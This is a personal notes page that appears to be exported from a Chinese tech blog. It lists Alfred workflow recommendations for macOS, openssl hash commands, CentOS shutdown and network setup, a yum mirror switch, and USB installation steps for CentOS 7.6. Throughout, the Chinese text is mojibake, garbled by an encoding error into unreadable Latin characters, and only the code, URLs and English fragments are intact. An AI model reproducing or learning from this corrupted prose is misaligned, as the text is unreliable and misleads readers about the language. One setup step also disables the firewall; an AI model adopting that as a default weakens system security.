<h4 id="è®¤è¯†-WORKFLOWS-ç»“æ„"><a href="#è®¤è¯†-WORKFLOWS-ç»“æ„" class="headerlink" title="è®¤è¯† WORKFLOWS ç»“æ„"></a>è®¤è¯† WORKFLOWS ç»“æ„</h4><p>å®ç° WorkFlows çš„å››ä¸ªåŸºæœ¬å¯¹è±¡ï¼š<code>trigger</code>ã€<code>keyword</code>ã€<code>action</code>ã€<code>output</code>ã€‚Alfred é€šè¿‡å°†è¿™å››ä¸ªåŸºæœ¬å¯¹è±¡åˆç†é“¾æ¥ã€ŒConnectã€ï¼Œä¾¿èƒ½å®ç°å„ç§é«˜çº§åŠŸèƒ½ã€‚è€Œåœ¨ Alfred çš„ Workflow é…ç½®ç•Œé¢ä¸­ï¼Œå¤§ä½“ä¸Šå¯ä»¥å°†å…¶åˆ†ä¸ºä¸‰æ ï¼Œtrigger å’Œ keyword éƒ½ä¼šè§¦å‘åç»­è¡Œä¸ºï¼Œæ‰€ä»¥å½’åˆ°ã€ŒåŸå› ã€ç±»ï¼›Action æ˜¯ã€Œè¿‡ç¨‹ã€ç±»ï¼Œä¹Ÿæ˜¯ workflow çš„æ ¸å¿ƒï¼Œå®ƒè´Ÿè´£å¤„ç†ç”¨æˆ·éœ€æ±‚ï¼›è€Œ output æ˜¯ã€Œç»“æœã€ç±»ï¼Œè´Ÿè´£æŠŠ action çš„ç»“æœä»¥ä¸€å®šçš„å½¢å¼ä¼ é€’ç»™ç”¨æˆ·ï¼Œå¯ä»¥æ˜¯ç›´æ¥å±æ˜¾ï¼Œä¹Ÿå¯ä»¥æ˜¯å¦å­˜ä¸ºæ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥æ˜¯è¿”å›åˆ°æœ€åä¸€ä¸ªç¨‹åºçš„è¾“å…¥æ¡†ä¸­ã€‚æ€»ä¹‹è¿™ä¸‰ä¸ªç±»åˆ«ã€Œå››ä¸ªå¯¹è±¡ã€å„å¸å…¶èŒï¼Œæœ€ç»ˆå¯ä»¥å®Œæˆè¾ƒä¸ºå¤æ‚çš„æ•°æ®å¤„ç†å’Œç”¨æˆ·éœ€æ±‚ã€‚è€Œè¿™å››ä¸ªå¯¹è±¡éƒ½å¯ä»¥ç”¨ã€Œçº¿ã€é“¾æ¥ï¼Œæ¥å½¢æˆç›´æ¥æˆ–é—´æ¥çš„æ¡ä»¶ç»“æœå…³ç³»ã€‚</p>
<p>æœ¬æ–‡ä¸»è¦æ˜¯æé«˜æ•ˆç‡ï¼Œæ‰€ä»¥å…³äºå¦‚ä½•è‡ªå®šä¹‰ Workflowsï¼ˆå·¥ä½œæµï¼‰æš‚æ—¶ä¸è®²è§£ï¼Œåé¢æœ‰éœ€è¦åœ¨å›æ¥å¢åŠ ï¼ŒåŸå›  Workflow åˆ›ä½œçš„é—¨æ§›æ¯”è¾ƒä½ï¼Œç±»ä¼¼iOSçš„ workflowsï¼ŒåŒæ—¶ workflow æ”¯æŒçš„ç¼–ç¨‹è¯­è¨€ä¹Ÿéå¸¸å¤šã€‚å¯ä»¥å‚è€ƒç°æœ‰çš„é‚£äº› Workflowsï¼ˆå·¥ä½œæµï¼‰ï¼Œå¯ä»¥çœ‹åˆ°ä»–ä»¬æ˜¯æ€ä¹ˆæ„å»ºå’Œæµç¨‹çš„ã€‚å¦å¤–ï¼Œä¹Ÿå¯ä»¥å‚è€ƒæˆ‘å†™è¿‡çš„ Workflowsï¼š<a href="https://ihtcboy.com/2019/11/17/2019-11-17_%E4%B8%80%E4%B8%AAAlfred%E7%9A%84Workflow%E8%81%8A%E5%A4%A9%E5%86%85%E5%AE%B9%E5%BC%95%E7%94%A8%E6%B6%88%E6%81%AF/">ç”¨ Alfred Workflow å®ç°èŠå¤©å†…å®¹å¿«é€Ÿå¼•ç”¨å›å¤</a>ï¼Œå€Ÿé‰´ä¸€äº›ç—›ç‚¹ï¼Œæ¥å®ç°è‡ªå·±çš„å·¥ä½œæµï¼</p>
<p>ä¸‹é¢ä¼šåˆ—å‡ºæˆ‘ç°åœ¨ä½¿ç”¨çš„ä¸€äº›é«˜æ•ˆçš„ Workflowsï¼ˆå·¥ä½œæµï¼‰æ’ä»¶ï¼Œå› ä¸ºå¤ªå¤šï¼Œæ‰€ä»¥å°±ä¸å…¨éƒ¨éƒ½ä»‹ç»ï¼Œå¤§å®¶å¯ä»¥åœ¨è¿™é‡Œçœ‹åˆ°æˆ‘ä½¿ç”¨çš„å…¨éƒ¨ Alfred ç›¸å…³çš„å†…å®¹ï¼š<a href="https://github.com/iHTCboy/macOSConfig/tree/master/Alfred">macOSConfig&#x2F;Alfred - iHTCboy</a></p>
<h4 id="é«˜æ•ˆ-WORKFLOWS-æ¨è"><a href="#é«˜æ•ˆ-WORKFLOWS-æ¨è" class="headerlink" title="é«˜æ•ˆ WORKFLOWS æ¨è"></a>é«˜æ•ˆ WORKFLOWS æ¨è</h4><ul>
<li><strong>æœ€è¿‘ä½¿ç”¨çš„æ–‡ä»¶&#x2F;åº”ç”¨ç­‰</strong></li>
</ul>
<p>æ•™ç¨‹ï¼š<a href="https://sspai.com/post/47063">å¦™ç”¨ Alfred è®©ä½ æœ€è¿‘ä½¿ç”¨çš„æ–‡ä»¶è§¦æ‰‹å¯åŠ</a><br>ä¸‹è½½ï¼š<a href="https://github.com/mpco/AlfredWorkflow-Recent-Documents/releases">mpco&#x2F;AlfredWorkflow-Recent-Documents</a></p>
<ul>
<li><strong>Finderè·¯å¾„å¿«é€Ÿæ‰“å¼€åˆ‡æ¢åˆ°ç»ˆç«¯ï¼ˆiTermï¼‰çš„è·¯å¾„</strong><br>ä¸‹è½½ï¼š<a href="http://www.packal.org/workflow/terminalfinder">TerminalFinder | Packal</a></li>
<li><strong>å¿«é€Ÿå¤åˆ¶å½“å‰æ–‡ä»¶å¤¹è·¯å¾„æˆ–è€…æ–‡ä»¶åå­—</strong><br>æ­¤æ’ä»¶æ¥æºï¼š<a href="https://github.com/hzlzh/Alfred-Workflows">hzlzh&#x2F;Alfred-Workflows</a>ï¼Œä¸‹é¢è¿™ä¸ªä¸‹è½½é“¾æ¥æ˜¯åšä¸»æ”¹é€ åçš„ï¼Œå¢åŠ äº†æ–‡ä»¶åçš„å¤åˆ¶ï¼Œå’Œä½¿ç”¨æœ€æ–°çš„ Finder å›¾æ ‡ã€‚å¿«æ·å¤åˆ¶å½“å‰Finderé€‰æ‹©çš„æ–‡ä»¶(<code>cp</code>)çš„æ–‡ä»¶è·¯å¾„æˆ–æ–‡ä»¶å(<code>cpn</code>)ã€‚<br>ä¸‹è½½ï¼š<a href="https://github.com/iHTCboy/macOSConfig/tree/master/Alfred">macOSConfig&#x2F;Alfred at master Â· iHTCboy&#x2F;macOSConfig</a></li>
<li><strong>Xcode å¼€å‘è€…æ¸…ç† DerivedData æ•°æ®</strong><br>ä¸‹è½½ï¼š<a href="https://github.com/ChopinChao/xcdd_workflow">ChopinChao&#x2F;xcdd_workflow: a simple xcdd workflow for Alfred2</a></li>
<li><strong>å…¨å±€æ‰“å¼€Appï¼ˆå¯è‡ªå®šä¹‰å¿«æ·é”®ï¼‰</strong><br>æ•™ç¨‹ï¼š<a href="http://mac.bestswifter.com/mac-gong-zuo-liu/you-xiu-workflow-tui-jian.html">ä¼˜ç§€ workflow æ¨è Â· GitBook</a><br>ä¸‹è½½ï¼š<a href="https://github.com/bestswifter/my-workflow/blob/master/AppLauncher.alfredworkflow">my-workflow&#x2F;AppLauncher.alfredworkflow Â· bestswifter&#x2F;my-workflow</a></li>
<li><strong>Linux Command</strong><br>ä¸‹è½½ï¼š<a href="https://github.com/jaywcjlove/linux-command">jaywcjlove&#x2F;linux-command: Linuxå‘½ä»¤å¤§å…¨æœç´¢å·¥å…·ï¼Œå†…å®¹åŒ…å«Linuxå‘½ä»¤æ‰‹å†Œã€è¯¦è§£ã€å­¦ä¹ ã€æœé›†ã€‚https://git.io/linux</a></li>
<li><strong>Encode &#x2F; Decode</strong><br>ä¸‹è½½ï¼š<a href="https://github.com/willfarrell/alfred-encode-decode-workflow">willfarrell&#x2F;alfred-encode-decode-workflow: Encoding and decoding a sting into multiple variations.</a></li>
<li><strong>å¿«é€Ÿè°ƒæ•´å›¾ç‰‡å°ºå¯¸</strong><br>ä¸‹è½½ï¼š<a href="http://www.packal.org/workflow/resize-image">Resize Image | Packal</a></li>
<li><strong>é…åˆ TinyPNG å¿«é€Ÿå‹ç¼©å›¾ç‰‡</strong><br>æ•™ç¨‹ï¼š<a href="https://evolly.one/2019/04/12/77-alfred-gallery/">alfred ä½¿ç”¨ workflows å¿«é€Ÿè¿›è¡Œå›¾ç‰‡å‹ç¼©</a><br>ä¸‹è½½ï¼š[alfred-gallery&#x2F;image Compressor.alfredworkflow - BlackwinMin&#x2F;alfred-gallery](<a href="https://github.com/BlackwinMin/alfred-gallery/blob/master/image">https://github.com/BlackwinMin/alfred-gallery/blob/master/image</a> Compressor&#x2F;image Compressor.alfredworkflow)</li>
<li><strong>å–è‰²å€¼å·¥å…·</strong><br>ä¸‹è½½ï¼š<a href="http://www.packal.org/workflow/colors">Colors | Packal</a></li>
<li><strong>å¿«é€Ÿåœ¨å½“å‰ Finder çª—å£åˆ›å»ºæ–°æ–‡ä»¶</strong><br>ä¸‹è½½ï¼š<a href="http://www.packal.org/workflow/newfile">NewFile | Packal</a></li>
<li><strong>Chrome History</strong><br>Chrome History ä»¥åŠ Chrome Bookmarks å¯ä»¥ç”¨äºæœç´¢ Chrome çš„æ”¶è—ä¹¦ç­¾å’Œå†å²è®°å½•ï¼ˆæ”¯æŒæ¨¡ç³Šæœç´¢ï¼‰ã€‚<br>ä¸‹è½½ï¼š<a href="https://github.com/tupton/alfred-chrome-history">tupton&#x2F;alfred-chrome-history: Search your Google Chrome history in Alfred</a></li>
<li><strong>ä»è°·æ­Œæµè§ˆå™¨æ‰“å¼€URL</strong><br>ä¸‹è½½ï¼š<a href="https://www.packal.org/workflow/alfred-chrome">Alfred Chrome | Packal</a></li>
<li><strong>æœ‰é“ç¿»è¯‘</strong><br>ä¸‹è½½ï¼š<a href="https://github.com/kaiye/workflows-youdao/">kaiye&#x2F;workflows-youdao: å­¦è‹±è¯­å’Œå†™å·¥å…·</a></li>
<li><strong>è°·æ­Œç¿»è¯‘</strong><br>ä¸‹è½½ï¼š<a href="https://github.com/xfslove/alfred-google-translate">xfslove&#x2F;alfred-google-translate: Alfred 3 workflow - translate with google apiğŸ’µğŸš«</a></li>
<li><strong>èŠå¤©å†…å®¹å¿«é€Ÿå¼•ç”¨å›å¤</strong><br>æ•™ç¨‹ï¼š<a href="https://ihtcboy.com/2019/11/17/2019-11-17_%E4%B8%80%E4%B8%AAAlfred%E7%9A%84Workflow%E8%81%8A%E5%A4%A9%E5%86%85%E5%AE%B9%E5%BC%95%E7%94%A8%E6%B6%88%E6%81%AF/">ç”¨ Alfred Workflow å®ç°èŠå¤©å†…å®¹å¿«é€Ÿå¼•ç”¨å›å¤</a><br>ä¸‹è½½ï¼š[macOSConfig&#x2F;Reply Message v1.0.alfredworkflow at master Â· iHTCboy&#x2F;macOSConfig](<a href="https://github.com/iHTCboy/macOSConfig/blob/master/Alfred/Reply">https://github.com/iHTCboy/macOSConfig/blob/master/Alfred/Reply</a> Message v1.0.alfredworkflow)</li>
<li><strong>Evernote</strong><br>æ”¯æŒå°è±¡ç¬”è®°çš„å…¨å±€æœç´¢ã€‚è¿™åŠŸèƒ½å¾ˆå¥½å¾ˆå¼ºå¤§ï¼Œèƒ½å¤Ÿå¸®åŠ©è‡ªå·±å¿«é€Ÿå®šä½åˆ°å…·ä½“çš„å°è±¡ç¬”è®°çš„æ¡ç›®ä¹‹ä¸Šã€‚<br>ä¸‹è½½ï¼š<a href="https://www.alfredforum.com/topic/840-evernote-workflow-9-beta-4-alfred-4/">Evernote Workflow 9 beta 4 (Alfred 4) - Share your Workflows - Alfred App Community Forum</a></li>
<li><strong>è´§å¸è½¬æ¢</strong><br>ä¸‹è½½ï¼š<a href="http://www.packal.org/workflow/currency-exchange">Currency Exchange | Packal</a></li>
<li><strong>Dash</strong><br>ä»£ç  Doc æ–‡æ¡£å…¨å±€å¿«é€Ÿæœç´¢ã€‚<br>æ•™ç¨‹ï¼š<a href="https://www.alfredapp.com/blog/productivity/dash-quicker-api-documentation-search/">Dash: Quicker API Documentation Browsing - Alfred Blog</a></li>
<li><strong>ä¸–ç•Œä¸»è¦åŸå¸‚æ—¶åŒºæŸ¥è¯¢</strong><br>ä¸‹è½½ï¼š<a href="http://www.packal.org/workflow/timezones">TimeZones | Packal</a></li>
</ul>
<p>è¿™äº›å·¥ä½œæµè¿˜æœ‰å¾ˆå¤šï¼Œå¤§å®¶å¯ä»¥å‘æŒ¥è‡ªå·±çš„éœ€æ±‚è‡ªå®šåˆ¶ã€‚å¦å¤–ï¼Œè¿˜æœ‰éå¸¸å¤šæ²¡æœ‰æ¨èçš„ï¼Œå¯ä»¥å‚è€ƒæ–‡æœ«çš„ workflows é“¾æ¥å¤§å…¨ã€‚</p>
<h4 id="æ›´å¤š-WORKFLOWS-èµ„æº"><a href="#æ›´å¤š-WORKFLOWS-èµ„æº" class="headerlink" title="æ›´å¤š WORKFLOWS èµ„æº"></a>æ›´å¤š WORKFLOWS èµ„æº</h4><ul>
<li><a href="https://www.alfredapp.com/workflows/">Workflows å®˜æ–¹ç«™ç‚¹</a><br>å®˜æ–¹æ¨èçš„ã€Œè£…æœºå¿…å¤‡ã€ç³»åˆ— Workflowsã€‚</li>
<li><a href="http://www.packal.org/">Packal</a><br>å®˜æ–¹æ¨èçš„ Workflows åˆ†äº«ç«™ç‚¹ã€‚</li>
<li><a href="http://www.alfredworkflow.com/">Workflows ä¸­æ–‡ç«™</a><br>å›½äººæ”¶è—çš„è¶…å¤š Workflows.</li>
<li><a href="https://github.com/zenorocha/alfred-workflows">zenorocha&#x2F;alfred-workflows: A collection of Alfred 3 and 4 workflows that will rock your world</a><br>è¿™ä¸ª Github ä¸Šç»´æŠ¤çš„ workflows å¾ˆèµï¼æ±‡æ€»äº†å¼€å‘ç”¨çš„ workflowsã€‚</li>
<li><a href="http://www.alfredforum.com/">Alfred è®ºå›</a><br>ä¸ªäººå¼€å‘è€…å¼€å‘çš„è§£å†³æ¯”è¾ƒç‰¹åˆ«çš„é—®é¢˜çš„æ’ä»¶å±…å¤šã€‚</li>
</ul>
<p>Dash for mac æ˜¯ä¸€æ¬¾åŠŸèƒ½å¼ºå¤§çš„APIæ–‡æ¡£æµè§ˆå™¨å’Œä»£ç ç‰‡æ®µç®¡ç†å™¨ï¼Œå†…ç½®äº†ä¸°å¯Œçš„APIæ–‡æ¡£ï¼Œå¤šè¾¾150å¤šç§ï¼Œå¯ä»¥åœ¨çº¿ä¸‹è½½å„ç§å¼€å‘APIå’Œæ–‡æ¡£èµ„æ–™ï¼Œå¯ä»¥è®©æ‚¨é›†ä¸­ç®¡ç†APIæ–‡æ¡£ï¼ŒåŒ…æ‹¬ç¦»çº¿ä¸‹è½½ã€æœç´¢ã€æŸ¥é˜…ï¼ŒåŒ…æ‹¬å„ç§ä¸»æµçš„ç¼–ç¨‹è¯­è¨€å’Œæ¡†æ¶ï¼Œå¦‚Cocos2D, Cocos3D, Corona, CSS, HTML, Java, Objective-C, JavaScript, jQuery, Vue,Reactç­‰, ä¸éœ€è¦åœ¨åˆ°å¤„ä¸‹è½½ API æ–‡æ¡£ï¼ŒDash å·²ç»è‡ªåŠ¨é›†æˆäº†ï¼Œå¹¶æ”¯æŒé›†æˆåˆ°Webstromã€Xcodeã€Alfredç­‰è½¯ä»¶ä¸­ï¼Œéå¸¸çš„å¼ºå¤§ï¼å¼€å‘è€…å¿…å¤‡çš„APIæ–‡æ¡£å‚è€ƒå·¥å…·ã€‚</p>
<p>å®˜ç½‘ä»‹ç»</p>
<p>Dash gives your Mac instant offline access to 200+ API documentation sets.</p>
<p>Dashä½¿æ‚¨çš„Macèƒ½å¤Ÿå³æ—¶è„±æœºè®¿é—®200å¤šä¸ªAPIæ–‡æ¡£é›†ã€‚</p>
<p>å¯ä»¥ç”¨å‘½ä»¤$ curl <a href="http://link.zhihu.com/?target=http://cip.cc">cip.cc</a> æ£€æŸ¥ç»ˆç«¯æ˜¯å¦å¤„äºä»£ç†çŠ¶æ€ã€‚</p>
<h1 id="MacOSå‘½ä»¤è¡Œè®¡ç®—æ–‡ä»¶hashå€¼"><a href="#MacOSå‘½ä»¤è¡Œè®¡ç®—æ–‡ä»¶hashå€¼" class="headerlink" title="MacOSå‘½ä»¤è¡Œè®¡ç®—æ–‡ä»¶hashå€¼"></a>MacOSå‘½ä»¤è¡Œè®¡ç®—æ–‡ä»¶hashå€¼</h1><h2 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h2><figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">openssl dgst -md5 <span class="number">123</span>.<span class="keyword">bin</span></span><br><span class="line"><span class="keyword"></span><span class="keyword">or</span></span><br><span class="line"><span class="keyword"></span>openssl md5 <span class="number">123</span>.<span class="keyword">bin</span></span><br><span class="line"><span class="keyword"></span><span class="keyword">or</span></span><br><span class="line"><span class="keyword"></span>md5 <span class="number">123</span>.<span class="keyword">bin</span></span><br><span class="line"><span class="keyword"></span><span class="keyword">or</span></span><br><span class="line"><span class="keyword"></span>md5 -s <span class="string">&quot;text&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="SHA1"><a href="#SHA1" class="headerlink" title="SHA1"></a>SHA1</h2><figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">openssl dgst -<span class="keyword">sha1 </span><span class="number">123</span>.<span class="keyword">bin</span></span><br><span class="line"><span class="keyword"></span><span class="keyword">or</span></span><br><span class="line"><span class="keyword"></span>openssl <span class="keyword">sha1 </span><span class="number">123</span>.<span class="keyword">bin</span></span><br></pre></td></tr></table></figure>

<h2 id="HmacMD5"><a href="#HmacMD5" class="headerlink" title="HmacMD5"></a>HmacMD5</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">openssl md5 -hmac <span class="string">&quot;replace_hmac_key_string_here&quot;</span> <span class="number">123.</span><span class="built_in">bin</span></span><br></pre></td></tr></table></figure>

<h2 id="sha256"><a href="#sha256" class="headerlink" title="sha256"></a>sha256</h2><figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">openssl <span class="keyword">sha256 </span>filename</span><br></pre></td></tr></table></figure>



<h1 id="Linux-centoså…³æœºå‘½ä»¤"><a href="#Linux-centoså…³æœºå‘½ä»¤" class="headerlink" title="Linux centoså…³æœºå‘½ä»¤"></a>Linux centoså…³æœºå‘½ä»¤</h1><ul>
<li>halt ç«‹åˆ»å…³æœº</li>
<li>poweroff ç«‹åˆ»å…³æœº</li>
<li>shutdown -h now ç«‹åˆ»å…³æœº(rootç”¨æˆ·ä½¿ç”¨)</li>
<li>shutdown -h 10 10åˆ†é’Ÿåè‡ªåŠ¨å…³æœº</li>
</ul>
<h1 id="Pd-å®‰è£…centos7-6-DVD"><a href="#Pd-å®‰è£…centos7-6-DVD" class="headerlink" title="Pd å®‰è£…centos7.6-DVD"></a>Pd å®‰è£…centos7.6-DVD</h1><p>centos7.6 é•œåƒï¼š<a href="https://vault.centos.org/7.6.1810/isos/x86_64/#">https://vault.centos.org/7.6.1810/isos/x86_64/#</a></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202221526178.png" alt="image-20220222152645143"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202221527685.png" alt="image-20220222152732652"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202221530958.png" alt="image-20220222153030922"></p>
<h2 id="é…ç½®ç½‘ç»œ"><a href="#é…ç½®ç½‘ç»œ" class="headerlink" title="é…ç½®ç½‘ç»œ"></a>é…ç½®ç½‘ç»œ</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi /etc/sysconfig/network-scripts/ifcfg-eth0</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">ä¿è¯æ˜¯å¦‚ä¸‹çš„å€¼ï¼ˆæ²¡æœ‰çš„keyå¯ä»¥æ–°å¢ï¼Œå·²æœ‰çš„keyéœ€è¦ç¡®ä¿æ˜¯ä»¥ä¸‹å€¼ï¼Œéƒ¨åˆ†å€¼å¿…é¡»æŒ‰è‡ªå·±çš„æƒ…å†µä¿®æ”¹ï¼‰å¦‚IPADDR/NETMASK/GATEWAY/DNS1ï¼‰</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">å…±äº«æ¨¡å¼</span> </span><br><span class="line">ONBOOT=yes</span><br><span class="line">BOOTPROTO=static</span><br><span class="line">IPADDR=10.211.55.100</span><br><span class="line">NETMASK=255.255.255.0</span><br><span class="line">GATEWAY=10.211.55.1</span><br><span class="line">DNS1=10.211.55.1</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">æ¡¥æ¥æ¨¡å¼</span></span><br><span class="line">ONBOOT=yes</span><br><span class="line">BOOTPROTO=static</span><br><span class="line">IPADDR=192.168.8.200</span><br><span class="line">NETMASK=255.255.255.0</span><br><span class="line">GATEWAY=192.168.8.1</span><br><span class="line">DNS1=8.8.8.8</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">systemctl restart network.service</span><br><span class="line">systemctl disable firewalld</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">å®é™…å¼€å‘ä¸­ä¸èƒ½å…³é—­é˜²ç«å¢™ï¼Œè€Œæ˜¯å¼€å¯æŸå‡ ä¸ªç«¯å£</span></span><br><span class="line">firewall-cmd --zone=public --add-port=4789/udp --permanent</span><br><span class="line">firewall-cmd --reload</span><br></pre></td></tr></table></figure>

<h2 id="æ›´æ–°yumæº"><a href="#æ›´æ–°yumæº" class="headerlink" title="æ›´æ–°yumæº"></a>æ›´æ–°yumæº</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install wget</span><br><span class="line"><span class="meta"># </span><span class="language-bash">å¤‡ä»½åŸæ¥çš„yumæº</span></span><br><span class="line">mv /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.backup</span><br><span class="line"><span class="meta"># </span><span class="language-bash">ä¸‹è½½163yumæºé…ç½®</span></span><br><span class="line">wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-6.repo</span><br><span class="line"><span class="meta"># </span><span class="language-bash">æ¸…ç©ºyumç¼“å­˜</span></span><br><span class="line">yum clean all</span><br><span class="line"><span class="meta"># </span><span class="language-bash">ç”Ÿæˆç¼“å­˜</span></span><br><span class="line">yum makecache</span><br></pre></td></tr></table></figure>



<h1 id="åˆ¶ä½œlinuxç³»ç»ŸUç›˜å¹¶ä½¿ç”¨Uç›˜å®‰è£…CentOS7-6ç³»ç»Ÿ"><a href="#åˆ¶ä½œlinuxç³»ç»ŸUç›˜å¹¶ä½¿ç”¨Uç›˜å®‰è£…CentOS7-6ç³»ç»Ÿ" class="headerlink" title="åˆ¶ä½œlinuxç³»ç»ŸUç›˜å¹¶ä½¿ç”¨Uç›˜å®‰è£…CentOS7.6ç³»ç»Ÿ"></a>åˆ¶ä½œlinuxç³»ç»ŸUç›˜å¹¶ä½¿ç”¨Uç›˜å®‰è£…CentOS7.6ç³»ç»Ÿ</h1><h2 id="åˆ¶ä½œlinuxå¯åŠ¨ç›˜"><a href="#åˆ¶ä½œlinuxå¯åŠ¨ç›˜" class="headerlink" title="åˆ¶ä½œlinuxå¯åŠ¨ç›˜"></a>åˆ¶ä½œlinuxå¯åŠ¨ç›˜</h2><p> ä½¿ç”¨å…‰ç›˜åˆ»å½•è½¯ä»¶å°†ç³»ç»Ÿé•œåƒåˆ»å½•åˆ°Uç›˜åä½¿ç”¨Uç›˜å®‰è£…ç³»ç»Ÿã€‚</p>
<ul>
<li><strong>å‡†å¤‡</strong></li>
</ul>
<p> 1ä¸ªå¤§äº8GUç›˜ï¼ˆæœ€å°1Gä»¥ä¸Šï¼Œæœ€å¥½8Gï¼‰</p>
<p> å®˜æ–¹ç³»ç»Ÿé•œåƒï¼ˆCentOS7-1810ï¼‰</p>
<p> å…‰ç›˜åˆ»å½•è½¯ä»¶ï¼ˆUltraISOï¼‰</p>
<ul>
<li><strong>åˆ¶ä½œlinuxç³»ç»Ÿä¼˜ç›˜</strong></li>
</ul>
<ol>
<li>æ‰“å¼€UltraISOè½¯ä»¶ï¼Œé€‰æ‹© â€œæ–‡ä»¶â€ -&gt; â€œæ‰“å¼€â€ é€‰æ‹©linuxç³»ç»Ÿé•œåƒï¼ˆisoæ–‡ä»¶ï¼‰å¹¶ â€œæ‰“å¼€â€ã€‚</li>
</ol>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202222008059.png" alt="img"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202222009963.png" alt="img"></p>
<ol start="2">
<li>æ’å…¥Uç›˜ï¼Œé€‰æ‹© â€œå¯åŠ¨â€ -&gt; â€œå†™å…¥ç¡¬ç›˜é•œåƒâ€ï¼Œç¡¬ç›˜é©±åŠ¨å™¨é€‰æ‹©åšä¸ºç³»ç»Ÿç›˜çš„Uç›˜ï¼Œå…¶ä»–é€‰é¡¹ä¸éœ€è¦æ”¹åŠ¨ã€‚</li>
</ol>
<p> <img src="https://www.w3xue.com/files/a20191/20190115092710856.png" alt="img"></p>
<ol start="3">
<li>ç‚¹å‡» â€å†™å…¥â€ ï¼Œç­‰å¾…åˆ»å½•å®Œæˆå³å¯ã€‚</li>
</ol>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202222009499.png" alt="img"></p>
<h2 id="ä½¿ç”¨Uç›˜å®‰è£…CentOS7-6ç³»ç»Ÿ"><a href="#ä½¿ç”¨Uç›˜å®‰è£…CentOS7-6ç³»ç»Ÿ" class="headerlink" title="ä½¿ç”¨Uç›˜å®‰è£…CentOS7.6ç³»ç»Ÿ"></a>ä½¿ç”¨Uç›˜å®‰è£…CentOS7.6ç³»ç»Ÿ</h2><ol>
<li><p>æ’å…¥åˆšåˆšåˆ¶ä½œçš„ç³»ç»ŸUç›˜è¿›å…¥BIOSï¼ˆæƒ æ™®è¿›å…¥biosçš„æ–¹å¼æ˜¯ä¸åœç‚¹å‡»escï¼‰ï¼Œæ›´æ”¹Uç›˜ä¸ºç¬¬ä¸€å¯åŠ¨é¡¹ã€‚  f10ä¿å­˜å¹¶é‡å¯ã€‚</p>
</li>
<li><p>è¿›å…¥centoså®‰è£…ç•Œé¢ï¼ŒæŒ‰TABé”®è¿›å…¥é…ç½®ç¼–è¾‘ï¼ˆæ ¹æ®æç¤ºï¼Œuefiæ˜¯æŒ‰eé”®ï¼‰</p>
</li>
</ol>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202222011906.png" alt="img"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202222011608.png" alt="img"></p>
<p>å°†é…ç½®æ”¹ä¸ºvmlinuz initrd&#x3D;initrd.img inst.stage2&#x3D;hdâ€¦â€¦quietæ”¹ä¸ºvmlinuz initrd&#x3D;initrd.img linux dd quietã€‚ä¿®æ”¹ä¹‹åå›è½¦ç³»ç»Ÿä¼šè¿›å…¥ç£ç›˜è®¾å¤‡åˆ—è¡¨ï¼ŒæŸ¥çœ‹Uç›˜çš„è®¾å¤‡åã€‚</p>
<p><img src="https://www.w3xue.com/files/a20191/20190115092711667.png" alt="img"></p>
<p>è®°ä½è®¾å¤‡åï¼ˆsdb4ï¼‰ï¼Œç„¶åé‡å¯ï¼Œè¿›å…¥å®‰è£…ç•Œé¢ï¼ŒæŒ‰TABç¼–è¾‘é…ç½®ï¼Œæ”¹ä¸ºvmlinuz initrd&#x3D;initrd.img inst.stage2&#x3D;hd:&#x2F;dev&#x2F;sdb4 quiet</p>
<p> sdb4å¯¹åº”ä½ çš„Uç›˜çš„è®¾å¤‡åï¼Œç„¶åæŒ‰å›è½¦è¿›å…¥å›¾å½¢å®‰è£…ç•Œé¢ã€‚</p>
<ol start="3">
<li>è¿›å…¥å›¾å½¢ç•Œé¢å¦‚æœä¸å‡ºç°æŠ¥é”™å°±æ˜¯æˆåŠŸäº†ï¼Œå¯ä»¥æ­£å¸¸å®‰è£…æ“ä½œç³»ç»Ÿäº†ã€‚</li>
</ol>
<ul>
<li><p>é€‰æ‹©è¯­è¨€</p>
</li>
<li><p>é€‰æ‹©æ—¶åŒºï¼ˆAsia&#x2F;Shanghaiï¼‰</p>
</li>
<li><p>é€‰æ‹©è½¯ä»¶åŒ…</p>
</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202222013832.png" alt="img"></p>
<ul>
<li>ç£ç›˜åˆ†åŒº</li>
</ul>
<p>æ³¨æ„è¦é€‰ç£ç›˜ï¼Œä¸è¦é€‰uç›˜</p>
<ol start="4">
<li>å®‰è£…ä¹‹åé‡å¯åå…³æœºç§»é™¤Uç›˜åœ¨å¼€æœºå³å¯æ­£å¸¸ä½¿ç”¨ã€‚</li>
</ol>
<p><img src="https://www.w3xue.com/files/a20191/20190115092712806.png" alt="img"></p>
